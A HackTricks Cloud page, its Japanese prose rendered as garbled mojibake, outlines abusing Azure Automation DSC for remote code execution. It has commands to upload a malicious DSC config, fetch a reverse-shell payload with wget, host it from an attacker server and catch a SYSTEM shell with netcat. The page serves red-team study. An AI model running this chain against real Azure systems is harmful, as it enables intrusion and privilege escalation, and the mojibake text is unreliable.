# Az - State Configuration RCE

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

**å®Œå…¨ãªæŠ•ç¨¿ã‚’ç¢ºèªã™ã‚‹: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ï¼ˆC2ï¼‰ã‚¤ãƒ³ãƒ•ãƒ©ã®æº–å‚™ã¨æ‰‹é †ã®æ¦‚è¦

#### æ¦‚è¦
ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€Windows Defenderã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸNishangã®`Invoke-PowerShellTcp.ps1`ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‚¤ãƒ³ãƒ•ãƒ©ã‚’è¨­å®šã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€Kali Linuxãƒã‚·ãƒ³ï¼ˆIP `40.84.7.74`ï¼‰ã‹ã‚‰ã‚·ãƒ³ãƒ—ãƒ«ãªPython HTTPã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦æä¾›ã•ã‚Œã¾ã™ã€‚æ“ä½œã¯ä»¥ä¸‹ã®æ‰‹é †ã§å®Ÿè¡Œã•ã‚Œã¾ã™ï¼š

#### ã‚¹ãƒ†ãƒƒãƒ—1 â€” ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆ
- **å¿…è¦ãªãƒ•ã‚¡ã‚¤ãƒ«:** 2ã¤ã®PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå¿…è¦ã§ã™ï¼š
1. `reverse_shell_config.ps1`: ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã¦å®Ÿè¡Œã™ã‚‹æœ›ã¾ã—ã„çŠ¶æ…‹æ§‹æˆï¼ˆDSCï¼‰ãƒ•ã‚¡ã‚¤ãƒ«ã€‚[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)ã‹ã‚‰å…¥æ‰‹ã§ãã¾ã™ã€‚
2. `push_reverse_shell_config.ps1`: æ§‹æˆã‚’VMã«å…¬é–‹ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã€‚[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)ã§å…¥æ‰‹ã§ãã¾ã™ã€‚
- **ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º:** ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®å¤‰æ•°ã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€ãƒªã‚½ãƒ¼ã‚¹åã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã€ã‚µãƒ¼ãƒãƒ¼/ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰è­˜åˆ¥å­ãªã©ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å›ºæœ‰ã®ç’°å¢ƒã«åˆã‚ã›ã¦èª¿æ•´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

#### ã‚¹ãƒ†ãƒƒãƒ—2 â€” æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã®åœ§ç¸®
- `reverse_shell_config.ps1`ã‚’`.zip`ãƒ•ã‚¡ã‚¤ãƒ«ã«åœ§ç¸®ã—ã€Azure Storage Accountã«è»¢é€ã™ã‚‹æº–å‚™ãŒæ•´ã„ã¾ã™ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ã‚¹ãƒ†ãƒƒãƒ—3 â€” ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®è¨­å®šã¨ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
- åœ§ç¸®ã•ã‚ŒãŸæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€Azureã®Set-AzStorageBlobContentã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€äº‹å‰å®šç¾©ã•ã‚ŒãŸAzure Storageã‚³ãƒ³ãƒ†ãƒŠã§ã‚ã‚‹azure-pentestã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ã‚¹ãƒ†ãƒƒãƒ— 4 â€” Kaliãƒœãƒƒã‚¯ã‚¹ã®æº–å‚™
- Kaliã‚µãƒ¼ãƒãƒ¼ã¯ã€GitHubãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰RevPS.ps1ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ãŸã‚ã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆWindows VMã¨ãƒãƒ¼ãƒˆã‚’æŒ‡å®šã™ã‚‹ã‚ˆã†ã«ç·¨é›†ã•ã‚Œã¾ã™ã€‚

#### ã‚¹ãƒ†ãƒƒãƒ—5 â€” è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®å…¬é–‹
- è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ãŒå®Ÿè¡Œã•ã‚Œã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒæŒ‡å®šã•ã‚ŒãŸå ´æ‰€ã«å±•é–‹ã•ã‚Œã¾ã™ã€‚

#### ã‚¹ãƒ†ãƒƒãƒ—6 â€” ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ãƒ›ã‚¹ãƒˆã¨ãƒªã‚¹ãƒŠãƒ¼ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—
- Python SimpleHTTPServerãŒé–‹å§‹ã•ã‚Œã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ›ã‚¹ãƒˆã—ã€ç€ä¿¡æ¥ç¶šã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ãŸã‚ã®Netcatãƒªã‚¹ãƒŠãƒ¼ã‚‚è¨­å®šã•ã‚Œã¾ã™ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- äºˆå®šã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã¯ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã€SYSTEMãƒ¬ãƒ™ãƒ«ã®ç‰¹æ¨©ã‚’ç²å¾—ã—ã¾ã™ã€‚

#### çµè«–

ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã®æˆåŠŸã—ãŸå®Ÿè¡Œã¯ã€è³‡æ ¼æƒ…å ±ã®ãƒ€ãƒ³ãƒ—ã‚„æ”»æ’ƒã‚’è¤‡æ•°ã®VMã«æ‹¡å¤§ã™ã‚‹ãªã©ã€ã•ã¾ã–ã¾ãªè¡Œå‹•ã®å¯èƒ½æ€§ã‚’é–‹ãã¾ã™ã€‚ã“ã®ã‚¬ã‚¤ãƒ‰ã¯ã€Azure Automation DSCã®é ˜åŸŸã§ã®ç¶™ç¶šçš„ãªå­¦ç¿’ã¨å‰µé€ æ€§ã‚’å¥¨åŠ±ã—ã¦ã„ã¾ã™ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
